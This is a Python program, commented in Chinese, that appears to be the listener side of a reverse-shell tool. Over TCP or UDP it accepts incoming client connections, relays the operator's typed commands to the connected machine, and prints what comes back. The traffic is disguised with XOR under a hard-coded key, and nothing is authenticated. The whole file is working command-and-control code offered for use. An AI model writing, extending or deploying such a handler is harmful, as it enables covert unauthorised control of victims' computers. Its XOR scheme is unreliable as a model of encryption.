#!/usr/bin/env python3
"""
Remote Shell Server - Bug Fixed Version
修复所有已知问题

用法:
    python3 server.py tcp -p 8888
    python3 server.py kcp -p 8889
"""

import socket
import select
import struct
import sys
import time
import threading
import argparse
from typing import Optional, Tuple, Dict

# 协议
PROTO_MAGIC = 0x52534832
MSG_DATA = 0x01
MSG_PING = 0x02
MSG_PONG = 0x03
MSG_WINSIZE = 0x04
MSG_EXIT = 0x05

HEADER_SIZE = 8
MAX_PAYLOAD = 8192  # 增大payload
CRYPTO_KEY = b"SecureShell2024@Key"

# 超时配置
KCP_HEARTBEAT_TIMEOUT = 40
TCP_HEARTBEAT_TIMEOUT = 80


def crypto_xor(data: bytes) -> bytes:
    """XOR加密"""
    key = CRYPTO_KEY
    klen = len(key)
    result = bytearray(len(data))
    for i in range(len(data)):
        result[i] = data[i] ^ key[i % klen] ^ (i & 0xFF)
    return bytes(result)


class Packet:
    """数据包"""
    
    @staticmethod
    def pack(msg_type: int, data: bytes = b'') -> bytes:
        if len(data) > MAX_PAYLOAD:
            raise ValueError("数据过大")
        
        hdr = struct.pack('!IBBH',
                         PROTO_MAGIC,
                         msg_type,
                         0,  # flags
                         len(data))
        
        encrypted = hdr[:4] + crypto_xor(hdr[4:] + data)
        return encrypted
    
    @staticmethod
    def unpack(raw: bytes) -> Optional[Tuple[int, bytes]]:
        if len(raw) < HEADER_SIZE:
            return None
        
        magic = struct.unpack('!I', raw[:4])[0]
        if magic != PROTO_MAGIC:
            return None
        
        decrypted = raw[:4] + crypto_xor(raw[4:])
        
        try:
            magic, msg_type, flags, length = struct.unpack('!IBBH', decrypted[:HEADER_SIZE])
        except:
            return None
        
        if length > MAX_PAYLOAD:
            return None
        
        if len(decrypted) != HEADER_SIZE + length:
            return None
        
        payload = decrypted[HEADER_SIZE:] if length > 0 else b''
        return (msg_type, payload)


class TCPSession:
    """TCP会话"""
    
    def __init__(self, conn, addr):
        self.conn = conn
        self.addr = addr
        self.last_seen = time.time()
        self.running = True
    
    def send(self, msg_type: int, data: bytes = b'') -> bool:
        try:
            pkt = Packet.pack(msg_type, data)
            self.conn.sendall(pkt)
            return True
        except:
            return False
    
    def recv(self, timeout: float = 1.0) -> Optional[Tuple[int, bytes]]:
        try:
            self.conn.settimeout(timeout)
            data = self.conn.recv(HEADER_SIZE + MAX_PAYLOAD)
            if not data:
                return None
            
            result = Packet.unpack(data)
            if result:
                self.last_seen = time.time()
            return result
        except socket.timeout:
            return None
        except:
            return None
    
    def alive(self) -> bool:
        return time.time() - self.last_seen < TCP_HEARTBEAT_TIMEOUT
    
    def close(self):
        self.running = False
        try:
            self.send(MSG_EXIT)
        except:
            pass
        try:
            self.conn.close()
        except:
            pass


def handle_tcp(conn, addr):
    """处理TCP连接"""
    sess = TCPSession(conn, addr)
    print(f"[+] TCP客户端: {addr}")
    
    # 接收线程
    def recv_loop():
        while sess.running:
            result = sess.recv(1.0)
            if result is None:
                if not sess.alive():
                    print(f"[-] TCP超时: {addr}")
                    sess.running = False
                    break
                continue
            
            msg_type, payload = result
            
            if msg_type == MSG_DATA:
                try:
                    # 直接输出，不打印命令回显
                    sys.stdout.write(payload.decode('utf-8', errors='replace'))
                    sys.stdout.flush()
                except:
                    pass
            elif msg_type == MSG_PING:
                sess.send(MSG_PONG)
    
    t = threading.Thread(target=recv_loop, daemon=True)
    t.start()
    
    # 输入线程
    try:
        while sess.running:
            r, _, _ = select.select([sys.stdin], [], [], 1.0)
            if r:
                line = sys.stdin.readline()
                if not line:
                    break
                # 只发送命令，不回显
                if not sess.send(MSG_DATA, line.encode('utf-8')):
                    break
    except KeyboardInterrupt:
        print()
    finally:
        sess.close()
        t.join(2)
        print(f"[*] TCP关闭: {addr}")


def start_tcp(host: str, port: int):
    """TCP服务器"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    # 增大缓冲区
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 256 * 1024)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 256 * 1024)
    
    sock.bind((host, port))
    sock.listen(5)
    
    print(f"[+] TCP监听: {host}:{port}")
    
    try:
        while True:
            sock.settimeout(1.0)
            try:
                conn, addr = sock.accept()
                t = threading.Thread(target=handle_tcp, args=(conn, addr), daemon=True)
                t.start()
            except socket.timeout:
                continue
    except KeyboardInterrupt:
        print()
    finally:
        sock.close()
        print("[*] TCP关闭")


def start_kcp(host: str, port: int):
    """KCP服务器"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    # 增大UDP缓冲区
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 256 * 1024)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 256 * 1024)
    
    sock.bind((host, port))
    sock.settimeout(1.0)
    
    print(f"[+] KCP监听: {host}:{port}")
    print("[*] KCP优化: 短超时, 快速心跳")
    
    clients: Dict[Tuple, float] = {}
    active_client: Optional[Tuple] = None
    client_lock = threading.Lock()
    
    # 接收线程
    def recv_loop():
        nonlocal active_client
        
        while True:
            try:
                data, addr = sock.recvfrom(65536)
                
                result = Packet.unpack(data)
                if not result:
                    continue
                
                msg_type, payload = result
                
                # 更新客户端 (带锁)
                with client_lock:
                    if addr not in clients:
                        clients[addr] = time.time()
                        active_client = addr
                        print(f"[+] KCP客户端: {addr}")
                    else:
                        clients[addr] = time.time()
                
                # 处理消息
                if msg_type == MSG_DATA:
                    try:
                        # 直接输出，不回显
                        sys.stdout.write(payload.decode('utf-8', errors='replace'))
                        sys.stdout.flush()
                    except:
                        pass
                
                elif msg_type == MSG_PING:
                    try:
                        pkt = Packet.pack(MSG_PONG)
                        sock.sendto(pkt, addr)
                    except:
                        pass
            
            except socket.timeout:
                # 清理超时客户端
                with client_lock:
                    now = time.time()
                    dead = [a for a, t in clients.items() if now - t > KCP_HEARTBEAT_TIMEOUT]
                    for a in dead:
                        print(f"[-] KCP超时: {a}")
                        del clients[a]
                        if active_client == a:
                            active_client = None
            except:
                pass
    
    t = threading.Thread(target=recv_loop, daemon=True)
    t.start()
    
    # 输入线程
    try:
        print("[*] 等待客户端...")
        
        while True:
            r, _, _ = select.select([sys.stdin], [], [], 1.0)
            
            if r:
                line = sys.stdin.readline()
                if not line:
                    break
                
                # 发送到活动客户端
                with client_lock:
                    if active_client:
                        try:
                            pkt = Packet.pack(MSG_DATA, line.encode('utf-8'))
                            sock.sendto(pkt, active_client)
                        except:
                            pass
    
    except KeyboardInterrupt:
        print()
    finally:
        sock.close()
        print("[*] KCP关闭")


def main():
    parser = argparse.ArgumentParser(description='远程Shell服务器')
    parser.add_argument('protocol', choices=['tcp', 'kcp'],
                       help='协议: tcp 或 kcp')
    parser.add_argument('-H', '--host', default='0.0.0.0',
                       help='监听地址 (默认: 0.0.0.0)')
    parser.add_argument('-p', '--port', type=int, required=True,
                       help='端口')
    
    args = parser.parse_args()
    
    print(f"[*] 远程Shell服务器")
    print(f"[*] 协议: {args.protocol.upper()}")
    print(f"[*] 地址: {args.host}:{args.port}")
    
    if args.protocol == 'tcp':
        start_tcp(args.host, args.port)
    else:
        start_kcp(args.host, args.port)


if __name__ == '__main__':
    main()
